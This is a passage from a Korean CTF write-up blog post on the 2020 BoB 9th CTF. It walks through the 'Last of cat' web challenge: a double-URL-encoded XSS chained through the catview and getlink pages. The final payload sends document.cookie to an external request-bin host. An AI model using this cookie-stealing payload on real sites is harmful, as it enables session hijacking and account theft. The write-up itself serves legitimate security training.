<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>2020 BoB 9th CTF Write-up | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="2020 BoB 9th CTF Write-up" />
<meta name="author" content="all" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="2020 BoB CTF Write-up" />
<meta property="og:description" content="2020 BoB CTF Write-up" />
<link rel="canonical" href="http://172.26.12.255:4000/2020-09-01/2020-BoB-CTF-Write-up-2" />
<meta property="og:url" content="http://172.26.12.255:4000/2020-09-01/2020-BoB-CTF-Write-up-2" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-09-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://172.26.12.255:4000/2020-09-01/2020-BoB-CTF-Write-up-2","headline":"2020 BoB 9th CTF Write-up","dateModified":"2020-09-01T00:00:00+00:00","datePublished":"2020-09-01T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://172.26.12.255:4000/2020-09-01/2020-BoB-CTF-Write-up-2"},"author":{"@type":"Person","name":"all"},"description":"2020 BoB CTF Write-up","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://172.26.12.255:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">2020 BoB 9th CTF Write-up</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>Write-up</i></center></span>
         
      
         
            <span class="tag"><center><i>CTF</i></center></span>
         
      
   
   
   <ul>
  <li><a href="#">2020 BoB CTF Write-up </a></li>
  <li><a href="#b04ec55f-b75d-47ac-8be0-1337c2641f96">ğŸ–¥ï¸ WEB</a>
    <ul>
      <li><a href="#c82dbe3a-6871-44af-a8b3-13c1fe0e55e4">Last of cat</a></li>
      <li><a href="#88cc70cc-816c-4db4-91db-cfa0f1d61fde">King musae</a></li>
      <li><a href="#48ebbbc5-61a9-4180-a3cf-84bb289d683a">Fun Fun Game</a></li>
      <li><a href="#80a3edb1-a805-409f-abed-16c4f235d5ae">babyweb</a></li>
      <li><a href="#aae9e3ee-3c0c-4baf-84fc-0b3ce4140773">CatDog</a></li>
      <li><a href="#a31b9d7a-2454-4408-9796-7743bdfe01d9">JWT-Extended</a></li>
    </ul>
  </li>
  <li><a href="#55257ad5-1d4c-4313-b0d4-feb6e529cbb4">ğŸ–¥ï¸ REVERSING</a>
    <ul>
      <li><a href="#dccd26d2-279c-4c94-9120-194dd56b7cd1">gocat</a></li>
      <li><a href="#8f7575ff-3cfc-40e1-9579-fdb8989bd585">bvm-rev</a></li>
      <li><a href="#3e66feff-1093-42d7-8151-0c9586d0acc5">Hot Patching</a></li>
      <li><a href="#df3280c0-969a-49cc-9676-84ad8f7a4a64">Hot Patching 777</a></li>
      <li><a href="#9e1053cd-3884-45db-a37a-32471921d7f0">EASYROID</a></li>
    </ul>
  </li>
  <li><a href="#9b799560-d728-49a3-a967-971a0d033d4f">ğŸ–¥ï¸ FORENSIC</a>
    <ul>
      <li><a href="#64558c76-c410-4400-ab49-15766f8520d8">SQL Eyes</a></li>
    </ul>
  </li>
  <li><a href="#b577288c-0165-401f-8936-93bd3fada5fd">ğŸ–¥ï¸ PWN</a>
    <ul>
      <li><a href="#39abfa2f-c121-4442-a769-09055252cd5e">bvm-pwn</a></li>
      <li><a href="#c4a067f0-9fd9-4412-ac59-15f4e6eb9bdd">cluster_shell</a></li>
      <li><a href="#05725414-0b62-484a-9bb5-7fecd7c05c17">Porn Master</a></li>
      <li><a href="#6dc64837-93f5-489e-9547-e3846f86dd3d">Housepital</a></li>
      <li><a href="#d663832a-2820-4673-bfa9-c0e7e1ec964a">Corona</a></li>
    </ul>
  </li>
  <li><a href="#f29fa220-8c9a-49a5-8b93-7ba1ea220b93">ğŸ–¥ï¸ CRYPTO</a>
    <ul>
      <li><a href="#e30d6697-49a2-40cc-956b-dbd6fea02623">Easy RSA</a></li>
      <li><a href="#5fcac5aa-b6c9-40bb-ba44-b93aa3fe652e">Boom Boom</a></li>
    </ul>
  </li>
  <li><a href="#5eb646bd-e9cf-4e9f-b8b7-41585ddbb233">ğŸ–¥ï¸ MISC</a>
    <ul>
      <li><a href="#1076afd7-b43e-403e-b644-abf839bee2ab">'gif't</a></li>
      <li><a href="#c6916655-7d89-4730-b76b-b240cf9895b2">Hide And Seek</a></li>
      <li><a href="#c4afb7fe-867b-4024-9abb-5f44be507c1d">Catcha</a></li>
      <li><a href="#1fe1f3a4-e0b5-4320-9ecb-7d51c06993af">verrox</a></li>
    </ul>
  </li>
</ul>
   
   <html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>2020 BoB CTF Write-up </title><style>
/* webkit printing magic: print all background colors */




@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}





.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}



.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}







.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
	white-space: pre-wrap;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.highlight-default {
}
.highlight-gray {
	color: rgb(155,154,151);
}
.highlight-brown {
	color: rgb(100,71,58);
}
.highlight-orange {
	color: rgb(217,115,13);
}
.highlight-yellow {
	color: rgb(223,171,1);
}
.highlight-teal {
	color: rgb(15,123,108);
}
.highlight-blue {
	color: rgb(11,110,153);
}
.highlight-purple {
	color: rgb(105,64,165);
}
.highlight-pink {
	color: rgb(173,26,114);
}
.highlight-red {
	color: rgb(224,62,62);
}
.highlight-gray_background {
	background: rgb(235,236,237);
}
.highlight-brown_background {
	background: rgb(233,229,227);
}
.highlight-orange_background {
	background: rgb(250,235,221);
}
.highlight-yellow_background {
	background: rgb(251,243,219);
}
.highlight-teal_background {
	background: rgb(221,237,234);
}
.highlight-blue_background {
	background: rgb(221,235,241);
}
.highlight-purple_background {
	background: rgb(234,228,242);
}
.highlight-pink_background {
	background: rgb(244,223,235);
}
.highlight-red_background {
	background: rgb(251,228,228);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(55, 53, 47, 0.6);
	fill: rgba(55, 53, 47, 0.6);
}
.block-color-brown {
	color: rgb(100,71,58);
	fill: rgb(100,71,58);
}
.block-color-orange {
	color: rgb(217,115,13);
	fill: rgb(217,115,13);
}
.block-color-yellow {
	color: rgb(223,171,1);
	fill: rgb(223,171,1);
}
.block-color-teal {
	color: rgb(15,123,108);
	fill: rgb(15,123,108);
}
.block-color-blue {
	color: rgb(11,110,153);
	fill: rgb(11,110,153);
}
.block-color-purple {
	color: rgb(105,64,165);
	fill: rgb(105,64,165);
}
.block-color-pink {
	color: rgb(173,26,114);
	fill: rgb(173,26,114);
}
.block-color-red {
	color: rgb(224,62,62);
	fill: rgb(224,62,62);
}
.block-color-gray_background {
	background: rgb(235,236,237);
}
.block-color-brown_background {
	background: rgb(233,229,227);
}
.block-color-orange_background {
	background: rgb(250,235,221);
}
.block-color-yellow_background {
	background: rgb(251,243,219);
}
.block-color-teal_background {
	background: rgb(221,237,234);
}
.block-color-blue_background {
	background: rgb(221,235,241);
}
.block-color-purple_background {
	background: rgb(234,228,242);
}
.block-color-pink_background {
	background: rgb(244,223,235);
}
.block-color-red_background {
	background: rgb(251,228,228);
}
.select-value-color-default { background-color: rgba(206,205,202,0.5); }
.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
.select-value-color-green { background-color: rgba(0,135,107,0.2); }
.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
.select-value-color-red { background-color: rgba(255,0,26,0.2); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="610af24a-8be5-44c4-aa60-1e3ec4abc36e" class="page sans"><header><h1 class="page-title">2020 BoB CTF Write-up </h1></header><div class="page-body"><h1 id="b04ec55f-b75d-47ac-8be0-1337c2641f96" class="">ğŸ–¥ï¸ WEB</h1><h2 id="c82dbe3a-6871-44af-a8b3-13c1fe0e55e4" class="">Last of cat</h2><hr id="71e83b5d-98da-4a05-acb8-66600756bd1b"/><figure id="15ed549f-6ae0-460c-bf96-e597a76f40d9" class="image"><a href="/assets/2020-09-01/bob/bob9Untitled.png"><img style="width:711px" src="/assets/2020-09-01/bob/bob9Untitled.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="3762cf8b-b2d6-4c78-9ef8-17506f7ede2f"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Last of Cat </div></figure><figure id="db8f1ac0-cca6-4cfb-8b31-377ae54b6627" class="image"><a href="/assets/2020-09-01/bob/bob91.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob91.png"/></a></figure><ul id="53a5b42d-7e91-461a-a00b-45f1e8228725" class="bulleted-list"><li><code>Last of Cat</code>  í˜ì´ì§€ì— ì ‘ì†í•˜ë©´ <code>Login Page</code>ê°€ ì¶œë ¥ëœë‹¤.  íšŒì›ê°€ì…ì„ í•˜ê¸° ìœ„í•´ <code>Join</code> ë²„íŠ¼ì„ í´ë¦­í•œë‹¤.</li></ul><figure id="a57df5a0-2321-48e6-beea-50890350a60d" class="image"><a href="/assets/2020-09-01/bob/bob92.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob92.png"/></a></figure><ul id="ab3852c4-ad6d-4eb1-a6b2-88f6f2fbb27d" class="bulleted-list"><li>íšŒì›ê°€ì…í•˜ê³  ë¡œê·¸ì¸ì„ í•˜ì—¬ ë©”ë‰´ë¥¼ í™•ì¸í•œë‹¤.</li></ul><figure id="41ad817b-8b51-4f14-91ba-91daaf08b1ce" class="image"><a href="/assets/2020-09-01/bob/bob93.png"><img style="width:1222px" src="/assets/2020-09-01/bob/bob93.png"/></a></figure><ul id="74b752a5-14bc-43a3-b1bd-97e047387137" class="bulleted-list"><li><code>Cat</code>ë©”ë‰´ì—ì„œëŠ” ê³ ì–‘ì´ ì‚¬ì§„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="66b00b2a-c42f-4b7b-bf7f-27a8062e2025" class="image"><a href="/assets/2020-09-01/bob/bob94.png"><img style="width:1222px" src="/assets/2020-09-01/bob/bob94.png"/></a></figure><p id="17f6fda0-5c76-4e06-bc98-719d3b7c1e0e" class="">
</p><ul id="89b9ea98-3242-424f-a748-d9edad81e509" class="bulleted-list"><li><code>Bot</code> ì—ì„œëŠ” <code>Input URL</code> ê¸°ëŠ¥ì„ í†µí•´ ë´‡ì—ê²Œ XSS êµ¬ë¬¸ì„ ì „ì†¡í•  ìˆ˜ ìˆë‹¤. ì•„ë˜ <code>Bot Log</code>  í…Œì´ë¸”ì—ì„œ ë´‡ì´ ë‚´ URLì„ í™•ì¸í–ˆëŠ”ì§€ ë°”ë¡œ í™•ì¸ì´ ê°€ëŠ¥í•˜ë‹¤.</li></ul><blockquote id="4025aedf-f51a-440b-9f85-0c9d837e8897" class="">ì´ ë¬¸ì œëŠ” XSSê°€ ë°œìƒí•˜ëŠ” í˜ì´ì§€ë¥¼ ì°¾ì•„ í•´ë‹¹ í˜ì´ì§€ë¥¼ í†µí•´ <strong>ì¿ í‚¤ë¥¼ íƒˆì·¨í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ë©´ í’€ë¦¬ëŠ”</strong> ê°„ë‹¨í•œ ë¬¸ì œë‹¤.</blockquote><figure id="91ad5aea-48e2-48c6-8af8-174d561984bf" class="image"><a href="/assets/2020-09-01/bob/bob95.png"><img style="width:1278px" src="/assets/2020-09-01/bob/bob95.png"/></a></figure><ul id="e3835d41-cb54-4e08-ba15-8f7c901f38ce" class="bulleted-list"><li>Cat Pageì— ì ‘ì†í•˜ë©´ ìœ„ í™”ë©´ê³¼ ê°™ì€ ê³ ì–‘ì´ ì‚¬ì§„ê³¼ ë¬¸êµ¬ê°€ ì¶œë ¥ëœë‹¤.</li></ul><ul id="8586f923-92c0-46a9-b8c6-52ef88a57e30" class="bulleted-list"><li>ì‚¬ì§„ê³¼ ë¬¸êµ¬ë¥¼ ì¶œë ¥í•˜ëŠ” ë£¨í‹´ì„ ì‚´í´ë³´ë©´, src íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ htmlì„ ì½ì–´ì˜¨ë‹¤. í•´ë‹¹ ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ XSSë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆë‹¤.</li></ul><pre id="c9d92000-e0b0-4f60-b169-d0068b5f31d5" class="code"><code>http://bob.zairo.kr:1337/catview?<mark class="highlight-teal_background"><strong>src=http://bob.zairo.kr:1337/cats/ae7d0baaa9b7ad791a6bfa53c936490e.html</strong></mark></code></pre><p id="0c679325-bed0-42f1-890d-1b4e2d966a30" class="">
</p><figure id="d6e9c1e4-737e-46d0-be8f-f4e6d0cc4ba1" class="image"><a href="/assets/2020-09-01/bob/bob96.png"><img style="width:1047px" src="/assets/2020-09-01/bob/bob96.png"/></a></figure><figure id="0df9839e-d9c2-4ed5-8dc2-749be3445639" class="image"><a href="/assets/2020-09-01/bob/bob97.png"><img style="width:578px" src="/assets/2020-09-01/bob/bob97.png"/></a></figure><ul id="549135d9-5bd3-455a-b50a-a0dfd18b459f" class="bulleted-list"><li><code>Cat</code> í˜ì´ì§€ì—ì„œ  <code>View</code> ë²„íŠ¼ì„ í´ë¦­í• ë•Œë¥¼ Fiddlerë¡œ ì‚´í´ë³´ë©´ <code>getlink</code> í˜ì´ì§€ì— <code>idx=ìˆ«ì</code> í˜•ì‹ìœ¼ë¡œ í˜ì´ì§€ë¥¼ ìš”ì²­í•˜ëŠ”ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. </li></ul><figure id="4e9bd89f-fd5e-46fb-95af-4b0936900505" class="image"><a href="/assets/2020-09-01/bob/bob98.png"><img style="width:555px" src="/assets/2020-09-01/bob/bob98.png"/></a></figure><ul id="a159fe62-517d-4ff9-9777-fc999603c442" class="bulleted-list"><li><code>/getlink?idx=2</code> ì— ì ‘ì†í•˜ë©´ ìœ„ì™€ ê°™ì´ idxì™€ linkê°€ ì¶œë ¥ëœë‹¤. </li></ul><figure id="809f30da-768e-42d3-a104-4c94b782f9ef" class="image"><a href="/assets/2020-09-01/bob/bob99.png"><img style="width:617px" src="/assets/2020-09-01/bob/bob99.png"/></a></figure><ul id="ab73e8d9-3deb-46ab-a2f1-ee44526291a7" class="bulleted-list"><li>getlink í˜ì´ì§€ì— ì„ì˜ ê°’ì„ ì…ë ¥í•  ê²½ìš° ê·¸ëŒ€ë¡œ ì¶œë ¥í•´ì£¼ëŠ”ë° í•´ë‹¹ í˜ì´ì§€ì˜ ì‘ë‹µì˜ <code>Content-Type</code> ì€ <code>application/json</code>ì´ë¼ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ”ë‹¤. í•˜ì§€ë§Œ, íŠ¹ì • í˜ì´ì§€ë¥¼ ë¡œë“œì‹œì¼œ í˜ì´ì§€ ë‚´ë¶€ì— í¬í•¨í•˜ëŠ” ê²½ìš° í•´ë‹¹ í˜ì´ì§€ë¥¼ ì´ìš©í•˜ì—¬ XSSë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆë‹¤.</li></ul><figure id="d99a0d7d-a965-4ba1-9e03-c15696a2dd3b" class="image"><a href="/assets/2020-09-01/bob/bob910.png"><img style="width:1033px" src="/assets/2020-09-01/bob/bob910.png"/></a></figure><pre id="13213855-1bdf-4f58-b183-cc44f45784c2" class="code"><code><a href="http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E">http://bob.zairo.kr:1337/catview?src=</a><a href="http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E"><mark class="highlight-teal_background"><strong>http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D</strong></mark></a><mark class="highlight-teal_background"><strong>%253Cscript%253Ealert(1)%253C%252Fscript%253E</strong></mark></code></pre><ul id="381b53ac-4789-41af-bd4d-a6a49e9cd51e" class="bulleted-list"><li><code>src</code>ì— getlink í˜ì´ì§€ idx íŒŒë¼ë¯¸í„° ê°’ì— <a href="http://bob.zairo.kr:1337/getlink?idx=&lt;script&gt;alert(1)&lt;/script&gt;"><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></a> ë¥¼ 2ë²ˆ URL Encoding í•˜ì—¬ ì…ë ¥í•˜ë©´ ê·¸ë¦¼ê³¼ ê°™ì´ alert êµ¬ë¬¸ì´ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="a0e01dc3-47f9-4e27-9600-8f7777823d08" class="image"><a href="/assets/2020-09-01/bob/bob911.png"><img style="width:1033px" src="/assets/2020-09-01/bob/bob911.png"/></a></figure><ul id="cd24a688-a304-42e1-8ba2-aea692350e1b" class="bulleted-list"><li><code>request bin</code>ì„ ì´ìš©í•´ ì„ì˜ ì„œë²„ë¡œ ì¿ í‚¤ë¥¼ ì „ì†¡í•˜ë„ë¡ í•˜ì—¬ íƒˆì·¨í•˜ë„ë¡ í•œë‹¤</li></ul><figure id="b24491ea-1e9f-4ea1-8f44-2182a75d8ed4" class="image"><a href="/assets/2020-09-01/bob/bob912.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob912.png"/></a></figure><p id="158c7216-c6bd-460c-9ba2-ffc3fbf55375" class=""><strong><mark class="highlight-teal_background">Payload</mark></strong></p><blockquote id="728a9609-932f-475e-b9d0-9e2af21fc8d0" class=""><a href="http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%253A%252F%252Fbob.zairo.kr%253A1337%252Fgetlink%253Fidx%253D%253Cscript%253Edocument.location.href%253D%2527https%253A%252F%252Fenwm946jeqwe.x.pipedream.net%252F%253Fparam%2527%252Bdocument.cookie%253C%252Fscript%253E">http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%3Cscript%3Edocument.location.href%3D%27https%3A%2F%2Fenwm946jeqwe.x.pipedream.net%2F%3Fparam%27%2Bdocument.cookie%3C%2Fscript%3E</a></blockquote><blockquote id="0639dbb2-7e96-4f04-baca-ef0e78c980f7" class=""><a href="http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=">http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=</a><mark class="highlight-gray_background"><strong>&lt;script&gt;document.location.href=&#x27;</strong></mark><mark class="highlight-gray_background"><strong><a href="https://enwm946jeqwe.x.pipedream.net/?param">https://enwm946jeqwe.x.pipedream.net/?param</a></strong></mark><mark class="highlight-gray_background"><strong>&#x27;+ document.cookie&lt;/script&gt;</strong></mark></blockquote><ul id="d8fc2371-889d-432b-9d0f-fa6c8dc67b6d" class="bulleted-list"><li>ìœ„ êµ¬ë¬¸ì„ í†µí•´ <code>catview</code> í˜ì´ì§€ì—ì„œ <code>src</code> íŒŒë¼ë¯¸í„°ë¡œ ê°’ì„ ì²˜ë¦¬í•  ë•Œ <code>getlink</code> í˜ì´ì§€ì— ì ‘ì†í•˜ê³  <code>getlink</code> í˜ì´ì§€ì˜ <code>idx</code>ì— ì…ë ¥ ë˜ì–´ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ êµ¬ë¬¸ì´ ì‹¤í–‰ë˜ì–´ ê²°êµ­ ì¿ í‚¤ë¥¼ íƒˆì·¨ í•  ìˆ˜ ìˆë‹¤. </li></ul><p id="06cabf18-6c1f-45a5-a162-ac45e5a9a0fe" class="">
